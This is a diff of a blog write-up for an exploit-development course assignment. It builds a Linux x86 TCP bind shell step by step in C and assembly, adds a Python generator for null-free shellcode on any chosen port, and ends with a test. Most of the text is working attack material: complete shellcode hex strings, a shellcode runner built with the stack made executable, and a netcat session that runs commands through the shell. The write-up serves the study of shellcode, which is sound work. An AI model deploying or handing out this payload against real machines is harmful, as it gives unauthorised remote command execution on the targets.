@@ -24,17 +24,33 @@ Student ID: PA-30398
 
 ## Foreword
 
-The first assignment requires you to write a `Bind Shell TCP`, which is simply a listening socket that executes commands received from the client and sends back the `standard output` and `standard error`.
+The 1st assignment requires you to write a `Bind Shell TCP`, which is simply a listening socket that executes commands received from the client and sends back the `standard output` and `standard error`.
 
-Follows the visual representation of this technique:
+The port number should be easily configurable.
 
-![TODO: INSERT IMAGE]()
+## Source code
+
+The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam](https://github.com/rbctee/SlaeExam/tree/main/code/assignment_1/).
+
+List of files:
+
+- [first_attempt/shell_bind_tcp.c](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.c): first attempt at writing a Bind Shell in `C`
+- [first_attempt/shell_bind_tcp.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.nasm): first attempt at writing a Bind Shell in `Assembly`
+- [final_attempt/shell_bind_tcp.c](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/final_attempt/shell_bind_tcp.c): final attempt at writing a Bind Shell in `C`
+- [final_attempt/shell_bind_tcp.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/final_attempt/shell_bind_tcp.nasm): final attempt at writing a Bind Shell in `Assembly`
+- [final_attempt/automation/wrapper.py](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/final_attempt/automation/wrapper.py): `python` script to automate the generation of shellcode based on arbitrary TCP ports
+- [final_attempt/automation/template.nasm](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/final_attempt/automation/template.nasm): generic template used by `wrapper.py`
 
 ## First Attempt
 
+Follows the visual representation of the first implementation:
+
+![First Implementation of Bind Shell TCP](/assets/img/slae32/bind_shellcode_tcp_1.jpg)
+*My first implementation of a TCP Bind Shell*
+
 ### C Code
 
-The first step is to create a listening TCP socket:
+Based on the graph previously shown, the first step is to create TCP socket that listens on a specific combination of IP address and TCP port. For now I chose to use `0.0.0.0:4444`; in the chapter **Automation** I explain how to use a `python` script to specify arbitary values (for the TCP port).
 
 ```cpp
 int server_socket_fd;
@@ -42,7 +58,11 @@ struct sockaddr_in server_address;
 
 // create a TCP socket
 server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+```
 
+{% sidenote The `socket()` function creates a socket, which is represented by a `File Descriptor` (abbreviated as `fd`) on Linux systems  %}
+
+```cpp
 server_address.sin_family = AF_INET;
 server_address.sin_addr.s_addr = INADDR_ANY;
 server_address.sin_port = htons(4444);
@@ -54,15 +74,23 @@ bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address
 listen(server_socket_fd, 1);
 ```
 
-Initially, a socket is created through the `socket` function, which returns a `File Descriptor` (on UNIX systems everyting is treated like a file, sockets too). The arguments `SOCK_STREAM` and `IPPROTO_TCP` allow for the creation of a `TCP` socket.
+Let's look at the code above: initially, a socket is created through the `socket` function, which returns a `File Descriptor`. The arguments `SOCK_STREAM` and `IPPROTO_TCP` allow for the creation of a `TCP` socket.
 
-After that, you have to to specify the address and port number on which to bind the socket. In this case, I used `INADDR_ANY` (i.e. bind the socket to `0.0.0.0`), and the typical port used by Metasploit (`4444`).
+After that, you have to to specify the address and port number on which to bind the socket. In this case, I used `INADDR_ANY` (i.e. `0.0.0.0`) and the typical TCP port used by *Metasploit* (`4444`).
 
 These variables are passed to the `bind` function, which performs the binding operation. However, if you were to run `ss -tnl` (or `netstat -plnt`), you wouldn't find the current socket yet.
 
-The reason is that we have to execute the `listen` function first. It accepts 2 arguments:
+The reason is that we have to execute the `listen` function first. Let's look at its [prototype](https://man7.org/linux/man-pages/man2/listen.2.html):
 
-1. the File Descriptor of the socket
+```cpp
+#include <sys/socket.h>
+
+int listen(int sockfd, int backlog);
+```
+
+It accepts 2 arguments:
+
+1. the file descriptor of a TCP socket
 2. *the maximum length to which the queue of pending connections for sockfd may grow* (ref: [man page](https://man7.org/linux/man-pages/man2/listen.2.html))
 
 Before being able to receive data and execute commands, the socket has to accept a connection from incoming clients:
@@ -78,7 +106,7 @@ client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, 
 
 {% sidenote Accept a client connection and place its socket inside the variable `client_address` %}
 
-```
+```cpp
 // redirect standard input/output/error to the socket
 dup2(client_socket_fd, 0);
 dup2(client_socket_fd, 1);
@@ -103,23 +131,23 @@ while ((bytes_read = recv(client_socket_fd, &client_command, 1024, 0)) > 0) {
 }
 ```
 
-The loop right above checks if the client has sent any data. If so, it executes the command and sends input/output/errors to the client socket.
+The loop right above checks if the client has sent any data. If so, it executes the command and sends `input`/`output`/`error` to the client socket.
 
-Finally, it uses the function `memset` in order to clear the buffer that stores the command, in order to avoid previous commands from corrupting next ones.
+Finally, it uses the function `memset` to clear the buffer that stores the command, in order to avoid previous commands from corrupting next ones.
 
-The full code can be found inside the [repo created for this exam](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.c).
+The full C program can be found inside the [repo created for this exam](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.c).
 
-### Assembly Code
+### Assembly
 
 #### Socket creation
 
-The first function we need to convert into Assembly is `socket`. Unfortunately there isn't a specific syscall that creates a socket, however there's one named `socketcall`. According to its [man page](https://linux.die.net/man/2/socketcall):
+The first function we need to convert into Assembly is `socket`. Unfortunately, there isn't a specific syscall that creates a socket, although there is one named `socketcall`. Follows an excerpt taken from its [man page](https://linux.die.net/man/2/socketcall):
 
 > `int socketcall(int call, unsigned long *args);`
 >
 > **socketcall()** is a common kernel entry point for the socket system calls. *call* determines which socket function to invoke. *args* points to a block containing the actual arguments, which are passed through to the appropriate call.
 
-Based on this description and the function definition it seems we need to find the right `call` value that references `socket()`. Although man pages don't list all the possible values for this argument (please contact me if you find them inside the man pages), we can take a look at the source code of the Linux kernel.
+Based on this description and the function prototype, it seems we first need to find the right `call` value that references `socket()`. Although man pages don't list all the possible values for this argument (please contact me if you find them inside the man pages), we can take a look at the source code of the Linux kernel.
 
 To be more specific, [this page](https://github.com/torvalds/linux/blob/master/net/socket.c#L2901) contains the implementation of the `socketcall` function, listing several possible value for the argument `call`:
 
@@ -155,7 +183,7 @@ switch (call) {
 // ...
 ```
 
-Nevertheless, it still isn't what we want: it doesn't show the integer values of these values. Digging a bit deeper, I found them inside the file [include/uapi/linux/net.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h#L27).
+Nevertheless, it isn't quite what we want: it doesn't show the integer values for these values. Digging a bit deeper, I found them inside the file [include/uapi/linux/net.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h#L27) of the Linux kernel.
 
 ```cpp
 #define SYS_SOCKET            1      /*     sys_socket(2)          */
@@ -180,7 +208,7 @@ Nevertheless, it still isn't what we want: it doesn't show the integer values of
 #define SYS_SENDMMSG          20     /*     sys_sendmmsg(2)        */
 ```
 
-Now we should be able to use the `socket` function for the creation of a TCP socket.
+Now we should be able to use the `socket` function to create a TCP socket.
 
 ```nasm
 ; Author: Robert Catalin Raducioiu (rbct)
@@ -256,7 +284,9 @@ server_address.sin_port = htons(4444);
 bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address));
 ```
 
-First, I need to understand how to create a `sockaddr_in` struct (which is the variable `server_address`). Based on [the manual of Linux](https://man7.org/linux/man-pages/man7/ip.7.html), it looks like this:
+First, I need to understand how to create a `sockaddr_in` struct (variable `server_address`).
+
+Based on [the Linux manual](https://man7.org/linux/man-pages/man7/ip.7.html), the definition of the struct looks like this:
 
 ```cpp
 struct sockaddr_in {
@@ -271,25 +301,27 @@ struct in_addr {
 }
 ```
 
-Now we need the type definition of `sa_family_t`, which is defined inside [/usr/include/socket.h](https://elixir.bootlin.com/linux/latest/source/include/linux/socket.h#L26):
+Now we need the type definition of `sa_family_t`, which I found defined inside the file [/usr/include/socket.h](https://elixir.bootlin.com/linux/latest/source/include/linux/socket.h#L26):
 
 ```cpp
 typedef __kernel_sa_family_t    sa_family_t;
 ```
 
-Based on the file [include/uapi/linux/socket.h](https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/socket.h#L10):
+According to the file [include/uapi/linux/socket.h](https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/socket.h#L10), it's an `unsigned short` integer:
 
 ```cpp
 typedef unsigned short __kernel_sa_family_t;
 ```
 
-So it is an unsigned short. On x86 systems it occupies `2 bytes` of data. Now, there's only `in_port_t` left. It is defined inside the file [netinetin.h](https://man7.org/linux/man-pages/man0/netinet_in.h.0p.html):
+On x86 systems an unsigned short integer occupies `2 bytes` of data. Now there's only `in_port_t` left. The latter is defined inside the file [netinetin.h](https://man7.org/linux/man-pages/man0/netinet_in.h.0p.html):
 
 > The `<netinet/in.h>` header shall define the following types:
 >
 > - `in_port_t` Equivalent to the type uint16_t as described in `<inttypes.h>`
 
-Based on this information, now the struct should look like this:
+It seems to be an `unsigned short` integer, just like `sa_family_t`.
+
+Based on all of this information, now the struct should look like this:
 
 ```cpp
 struct sockaddr_in {
@@ -303,13 +335,15 @@ struct in_addr sin_addr {
 }
 ```
 
-P.S. Don't forget the definition of `sys_socketcall`:
+One of the mistakes I made is to sum the bytes of the variables in order to calculate the size of the struct (`short` + `short` + `int` = `8` bytes). Long story short: many `struct` objects use `padding` for compatibility with different systems.
+
+Moreover, don't forget the definition of `sys_socketcall`:
 
 ```cpp
 int syscall(SYS_socketcall, int call, unsigned long *args);
 ```
 
-In particular, in the case of the `bind` function, you can't use `ECX`, `EDX`, and so on, because they would be passed to `sys_socketcall`. Just like before, the arguments are passed as a pointer, using the `ECX` register.
+In particular, in the case of the `bind` function, you can't use `ECX`, `EDX`, and so on, because they would be passed to `sys_socketcall`. Just like before (see chapter *Socket creation*), the arguments are passed as a pointer, using the `ECX` register.
 
 Follows the assembly code:
 
@@ -355,12 +389,13 @@ Follows the assembly code:
     int 0x80
 ```
 
-You may be wondering why I used `PUSH 16` for the 3rd argument of `bind()`, instead of the current size of struct, which is 8 bytes. Initially, I tried using `PUSH 8`, however `bind()` would return the value `0xffffffea` (`EINVAL`), which means an argument is invalid.
+You may be wondering why I used `PUSH 16` for the 3rd argument of `bind()`, instead of the current size of struct, which is 8 bytes. As I said before: it's all about `padding`. Initially, if I used `PUSH 8`, the call to `bind()` would return the value `0xffffffea` (`EINVAL`), which means one of the arguments is invalid.
 
-Later, I discovered the right size should be `16` (doing a simple `printf` of `sizeof(server_address)`). However, the real reason can be found in the definition of the struct:
+Later, I discovered the right size of the struct is `16` bytes (doing a simple `printf` of `sizeof(server_address)`). However, the real reason can be inferred from the definition of the struct:
 
 ```cpp
 #define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */
+
 struct sockaddr_in {
   __kernel_sa_family_t  sin_family;     /* Address family               */
   __be16                sin_port;       /* Port number                  */
@@ -372,11 +407,11 @@ struct sockaddr_in {
 };
 ```
 
-It uses padding characters to reach a size of 16 bytes.
+As you can see, it uses padding bytes in order to reach a size of `16` bytes.
 
 #### Listening for connections
 
-Now we need to convert the following line into assembly:
+Next, we need to convert the following line into assembly:
 
 ```cpp
 // set it as a passive socket that listens for connections
@@ -417,7 +452,7 @@ Follows the assembly code:
 
 #### Accepting connections
 
-It's time to accept connections from out client. We need to convert the following C code into assembly:
+It's time to accept incoming connections from clients (max 1 client in this case). We need to convert the following C code into assembly:
 
 ```cpp
 size_client_socket_struct = sizeof(struct sockaddr_in);
@@ -456,7 +491,7 @@ Follows the assembly code:
 
 #### I/O Redirection
 
-As mentioned previously, the redirection of Input/Output/Error is performed by means of the function `dup2`. The call to `accept()` returns the File Descriptor associated with the Client Socket.
+As mentioned previously, the redirection of `input`/`output`/`error` is performed by means of the function `dup2`. The call to `accept()` returns the File Descriptor associated with the Client Socket.
 
 ```cpp
 dup2(client_socket_fd, 0);
@@ -489,7 +524,7 @@ According to the file `/usr/include/i386-linux-gnu/asm/unistd_32.h`, `dup2` is t
     int 0x80
 ```
 
-This is good, but I wanted a better approach, one that uses fewer bytes and it's free of `NULL` bytes:
+This is good enough, but I wanted a better approach, one that uses fewer bytes and it's also free of `NULL` ones:
 
 ```nasm
     ; loop counter (repeats dup2() three times)
@@ -520,6 +555,8 @@ RepeatDuplicate:
     pop ecx
     loop RepeatDuplicate
 ```
+
+In the code above, the `loop` instruction is used to repeat the routine `RepeatDuplicate` three times, for `error` (fd: 2), `output` (fd: 1), and `input` (fd: 0).
 
 #### Command Execution
 
@@ -663,7 +700,16 @@ section .bss
     ReceivedData:   resb 1024
 ```
 
+To summarise: after redirecting input, output, and error, the program waits to receive data from the Client Socket, using the routine `ReceiveData`, which also clear the buffer to prevent corruption.
+
+After receiving the command, the `fork` syscall is employed. The reason is due to how `execve` works: once it executes the command, it process exits, so it wouldn't return to receiving other data. In this case, forking allows us to keep a `parent process` that receives commands, and spawn a `child process` for each command executed.
+
 ## Final attempt
+
+Follows the visual representation of the final implementation:
+
+![Final Implementation of Bind Shell TCP](/assets/img/slae32/bind_shellcode_tcp_2.jpg)
+*My final implementation of a TCP Bind Shell*
 
 ### C Code
 
@@ -741,18 +787,218 @@ SpawnShell:
 {% sidenote `ECX` and `EDX` are pointers to `NULL`, so **argv** and **envp** are empty %}
 
 ```nasm
-    ; 
     push 0x68732f6e
     push 0x69622f2f
     mov ebx, esp
 
     ; exceve syscall
-    mov eax, 11
+    xor eax, eax
+    mov al, 11
     int 0x80
 ```
 
 {% sidenote Call `execve` on `//bin/sh` %}
 
-## Source code
+As you can see, after it redirects input, output, and error, the `execve` syscall spawns an SH shell.
 
-The full source code is stored inside the repository created for this Exam: [rbctee/SlaeExam]().
+## Automation
+
+One of the requirements of the assignment is to be able to easily configure the TCP port. I decided to write `python` script that acts as a wrapper (script named `wrapper.py`):
+
+```py
+import os
+import sys
+import argparse
+import traceback
+import subprocess
+
+
+def print_shellcode(object_file_path):
+
+    try:
+        command = ["objcopy", "-O", "binary", "-j", ".text", object_file_path, "/dev/stdout"]
+        proc = subprocess.run(command, stdout=subprocess.PIPE)
+    except:
+        print(traceback.format_exc())
+        sys.exit(1)
+```
+
+{% sidenote The binary `objcopy` belongs to the package `binutils`, which must be installed, otherwise the program will throw an error %}
+
+```py
+    shellcode = proc.stdout
+    shellcode_string = ""
+
+    for b in shellcode:
+        shellcode_string += f"\\x{b:02x}"
+
+    if 0x00 in shellcode:
+        print(f"[!] Found NULL byte in shellcode")
+
+    print(f"[+] Shellcode length: {len(shellcode)} bytes")
+    print(f"[+] Shellcode:")
+    print(f'"{shellcode_string}";')
+```
+
+{% sidenote I wrote the function `print_shellcode` in order to extract the executable code from the `.text` section of the object file. It allows you to easily paste the shellcode into the shellcode runner %}
+
+```py
+def generate_shellcode(output_file_path):
+
+    object_file_path = output_file_path.replace(".nasm", ".o", 1)
+    executable_path = output_file_path.replace(".nasm", "", 1)
+
+    try:
+        os.system(f"nasm -f elf32 -o {object_file_path} {output_file_path}")
+        os.system(f"ld -m elf_i386 -o {executable_path} {object_file_path}")
+```
+
+{% sidenote The program also requires `nasm` and `ld`, the latter should be present by default on Linux systems %}
+
+```py
+        print(f"[+] Object file generated at {output_file_path}")
+        print(f"[+] Executable binary generated at {executable_path}")
+
+        print_shellcode(object_file_path)
+    except:
+        print(traceback.format_exc())
+        sys.exit(1)
+
+def replace_template_values(template_name, tcp_port, output_file_path):
+
+    with open(template_name) as f:
+        template_code = f.read()
+
+    tcp_port_hex = (tcp_port).to_bytes(2, "little").hex()
+
+    if '00' in tcp_port_hex:
+        if '00' in tcp_port_hex[:2]:
+            non_null_byte = tcp_port_hex[2:]
+            replace_code = f"mov bl, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
+        else:
+            non_null_byte = tcp_port_hex[:2]
+            replace_code = f"mov bh, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
+    else:
+        replace_code = f"push WORD 0x{tcp_port_hex}"
+```
+
+{% sidenote These last instructions allows you avoid `NULL` bytes in the TCP port number. For example, the port `256` is converted to `0x0001` (big endian), while port `80` is converted to `0x5000` %}
+
+```py
+    template_code = template_code.replace("{{ TEMPLATE_TCP_PORT }}", replace_code, 1)
+    
+    with open(output_file_path, 'w') as f:
+        f.write(template_code)
+
+def main():
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-p', '--port', type=int, help='TCP Port for the Bind Shell', required=True, metavar="[1-65535]")
+    parser.add_argument('-t', '--template', help='Path of the NASM template file. Example: -t /tmp/template.nasm', required=True)
+    parser.add_argument('-o', '--output', help='Path for the output file. Example: -o /tmp/output.nasm', required=True)
+
+    args = parser.parse_args()
+
+    tcp_port = args.port
+    if tcp_port not in range(1, 65536):
+        print(f"[!] Argument '--port' must be in range [1-65535]")
+        sys.exit(1)
+
+    shellcode_template = args.template
+    output_file_path = args.output
+
+    replace_template_values(shellcode_template, tcp_port, output_file_path)
+    generate_shellcode(output_file_path)
+
+
+if __name__ == '__main__':
+
+    main()
+
+```
+
+Thanks to `argparse`, when you run the script, it asks you for the required arguments:
+
+```bash
+python3 script.py -h
+
+# usage: script.py [-h] -p [1-65535] -t TEMPLATE -o OUTPUT
+
+# optional arguments:
+#   -h, --help            show this help message and exit
+#   -p [1-65535], --port [1-65535]
+#                         TCP Port for the Bind Shell
+#   -t TEMPLATE, --template TEMPLATE
+#                         Path of the NASM template file. Example: -t /tmp/template.nasm
+#   -o OUTPUT, --output OUTPUT
+#                         Path for the output file. Example: -o /tmp/output.nasm
+```
+
+If you pass the required arguments, it finally prints the shellcode which you can copy into a shellcode runner. Follows an example:
+
+```bash
+python3 script.py -p 80 -t ./template.nasm -o /tmp/output.nasm
+
+# [+] Object file generated at /tmp/output.nasm
+# [+] Executable binary generated at /tmp/output
+# [+] Shellcode length: 133 bytes
+# [+] Shellcode:
+# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\xb7\x50\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80";
+```
+
+As I mentioned previously in the sidenotes, the script requires the following binaries:
+
+- `objcopy` (from the package `binutils`)
+- `nasm` (from the homonymous package)
+- `ld` (The GNU linker)
+
+The python script and the `NASM` template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder [/code/assignment_1/final_attempt/automation](https://github.com/rbctee/SlaeExam/tree/main/code/assignment_1/final_attempt/automation).
+
+## Testing
+
+As regards the testing phase, I decided to use the python script to generate shellcode for a Bind Shell listening on the TCP port `1234`:
+
+```bash
+python3 script.py -p 1234 -t ./template.nasm -o /tmp/output.nasm
+
+# [+] Object file generated at /tmp/output.nasm
+# [+] Executable binary generated at /tmp/output
+# [+] Shellcode length: 130 bytes
+# [+] Shellcode:
+# "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";
+```
+
+To test the shellcode generated by the python script, I used the following C `shellcode runner`:
+
+```cpp
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";
+
+main() {
+    printf("Shellcode length: %d\n", strlen(code));
+
+    int (*ret)() = (int(*)())code;
+    ret();
+}
+```
+
+Compile and run it:
+
+```bash
+gcc -fno-stack-protector -z execstack -o tcp_bind_shell shellcode_runner.c
+./tcp_bind_shell
+```
+
+Finally, I confirmed I could connect with `netcat` and execute commands:
+
+```bash
+rbct@slae:~$ nc 127.0.0.1 1234
+whoami
+rbct
+id
+uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+exit
+rbct@slae:~$
+```
